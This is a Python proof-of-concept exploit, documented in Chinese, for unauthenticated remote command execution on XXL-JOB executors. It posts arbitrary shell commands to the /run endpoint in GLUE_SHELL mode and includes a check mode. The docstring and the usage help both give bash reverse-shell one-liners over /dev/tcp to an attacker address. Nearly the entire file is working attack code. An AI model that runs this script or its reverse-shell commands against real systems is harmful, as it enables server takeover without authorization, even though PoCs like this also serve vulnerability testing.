#!/usr/bin/env python3
"""
XXL-JOB Executor 未授权访问RCE漏洞 POC
漏洞名称: XXL-JOB Executor Unauthorized Access RCE
应用版本: XXL-JOB >= 2.2.0 (有RESTful API版本)
漏洞等级: 高危

==================== 漏洞描述 ====================
【漏洞原理】
XXL-JOB 是一个分布式任务调度平台，分为 admin（管理端）和 executor（执行器端）两部分。
executor 默认没有配置任何认证机制，未授权的攻击者可以直接向 executor 的 /run 端点
发送POST请求，通过 GLUE_SHELL 模式执行任意系统命令。

【影响范围】
- XXL-JOB >= 2.2.0 (RESTful API版本)
- XXL-JOB executor 默认配置未开启认证
- executor端口通常为 9999

【危害等级】
- 无需认证即可执行任意命令
- 可完全控制 executor 服务器
- CVSS评分: 9.8 (Critical)

==================== 环境要求 ====================
- Python 3.6+
- requests库 (pip install requests)
- 目标: XXL-JOB executor 端口 (默认9999)

==================== 验证步骤 ====================
1. 基础命令执行:
   python xxl_job_unacc_rce.py http://target:9999

2. 指定自定义命令:
   python xxl_job_unacc_rce.py http://target:9999 -c "whoami"

3. 仅端口检测:
   python xxl_job_unacc_rce.py http://target:9999 --check-only

4. 无回显命令 (如反弹shell):
   python xxl_job_unacc_rce.py http://target:9999 -c "bash -c 'bash -i >& /dev/tcp/your_ip/4444 0>&1'"

==================== 预期结果 ====================
- 成功时: HTTP 200，返回任务执行结果日志
- 失败时: HTTP 403/404 或无响应，表示executor可能不存在或已开启认证
- 注意: GLUE_SHELL命令执行一般无回显，需通过其他方式确认(如反弹shell、延时命令等)
"""

import sys
import json
import time
import logging
import argparse
import requests
from typing import Dict, Optional


class XXLJobUnaccRCE:
    """XXL-JOB Executor 未授权访问RCE漏洞验证POC"""

    VULN_NAME = "XXL-JOB Executor Unauthorized Access RCE"
    VULN_VERSION = "XXL-JOB >= 2.2.0"
    SEVERITY = "HIGH (CVSS 9.8)"

    def __init__(self, target: str, timeout: int = 15, proxy: str = None, verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl
        self.session = self._create_session()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Connection": "close",
            "Content-Type": "application/json"
        })
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def check(self) -> Dict:
        """
        检测目标executor是否存在未授权访问
        步骤1: 检查端口连通性
        步骤2: 发送无害命令验证
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }

        print("[*] 步骤1/2: 检查executor连通性...")
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            result["details"].append(f"executor响应: HTTP {resp.status_code}")
            print(f"[+] executor可达 (HTTP {resp.status_code})")
        except requests.exceptions.ConnectionError:
            result["status"] = "error"
            result["conclusion"] = f"executor端口不可达"
            return result
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"连接失败: {e}"
            return result

        print("[*] 步骤2/2: 发送无害检测命令...")
        test_cmd = f"echo XXL_JOB_POC_TEST_{int(time.time())}"
        result2 = self._execute_command(test_cmd)
        if result2.get("success"):
            result["status"] = "vulnerable"
            result["details"].append(f"/run端点响应: {result2.get('response', '')[:200]}")
            result["conclusion"] = "executor存在未授权访问漏洞! /run端点无需认证即可执行任意命令"
        else:
            result["status"] = "not_vulnerable"
            result["details"].append(result2.get("response", "无响应")[:100])
            result["conclusion"] = "executor不可利用，可能已开启认证或端点不存在"

        return result

    def _execute_command(self, command: str) -> Dict:
        """向executor发送命令执行请求"""
        url = f"{self.target}/run"
        data = {
            "jobId": 1,
            "executorHandler": "demoJobHandler",
            "executorParams": "demoJobHandler",
            "executorBlockStrategy": "COVER_EARLY",
            "executorTimeout": 0,
            "logId": 1,
            "logDateTime": int(time.time() * 1000),
            "glueType": "GLUE_SHELL",
            "glueSource": command,
            "glueUpdatetime": int(time.time() * 1000),
            "broadcastIndex": 0,
            "broadcastTotal": 0
        }

        try:
            resp = self.session.post(url, json=data, timeout=self.timeout)
            if resp.status_code == 200:
                try:
                    resp_json = resp.json()
                    if resp_json.get("code") == 200:
                        return {"success": True, "response": resp_json.get("msg", str(resp_json))}
                    return {"success": True, "response": str(resp_json)}
                except Exception:
                    return {"success": True, "response": resp.text[:500]}
            return {"success": False, "response": f"HTTP {resp.status_code}: {resp.text[:200]}"}
        except requests.exceptions.ConnectionError:
            return {"success": False, "response": "连接失败"}
        except Exception as e:
            return {"success": False, "response": str(e)}

    def exploit(self, command: str = "id") -> Dict:
        """
        利用未授权访问执行命令
        步骤1: 发送命令到executor的/run端点
        步骤2: 解析响应结果
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "command": command,
            "status": "exploiting",
            "details": [],
            "conclusion": ""
        }

        print(f"[*] 发送命令到executor: {command}")
        exec_result = self._execute_command(command)

        if exec_result.get("success"):
            result["status"] = "exploited"
            result["response"] = exec_result.get("response", "")
            result["conclusion"] = f"命令执行成功! 服务端返回: {exec_result['response'][:300]}"
            if exec_result.get("response"):
                print(f"[+] 响应: {exec_result['response'][:300]}")
        else:
            result["status"] = "failed"
            result["conclusion"] = f"命令执行失败: {exec_result.get('response', '')}"
            print(f"[-] 失败: {exec_result.get('response', '')}")

        return result

    def run(self, command: str = "id") -> Dict:
        print(f"[*] {self.VULN_NAME} - 开始验证")
        print(f"[*] 目标: {self.target}")
        print(f"[*] 严重等级: {self.SEVERITY}")
        print("-" * 60)
        return self.exploit(command)

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]", "failed": "[-]", "error": "[!]", "not_vulnerable": "[-]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        if result.get("response"):
            print(f"    服务端响应: {result['response'][:300]}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="XXL-JOB Executor未授权访问RCE漏洞验证POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 基础利用
  python xxl_job_unacc_rce.py http://target:9999 -c "id"

  # 仅检测
  python xxl_job_unacc_rce.py http://target:9999 --check-only

  # 反弹shell（无回显）
  python xxl_job_unacc_rce.py http://target:9999 -c "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"

参数说明:
  target         目标executor URL (e.g., http://example.com:9999)
  -c, --command  要执行的命令 (默认: id)
  --check-only   仅检测不利用
  -t, --timeout  请求超时(秒) (默认: 15)
  --proxy        HTTP代理
  -k, --insecure 跳过SSL验证
  -v, --verbose  详细输出
  --output       输出格式 (text/json)
        """
    )
    parser.add_argument("target", help="目标executor URL (e.g., http://example.com:9999)")
    parser.add_argument("-c", "--command", default="id", help="要执行的命令 (默认: id)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)

    poc = XXLJobUnaccRCE(
        target=args.target, timeout=args.timeout,
        proxy=args.proxy, verify_ssl=not args.insecure
    )

    if args.check_only:
        result = poc.check()
    else:
        result = poc.run(args.command)

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
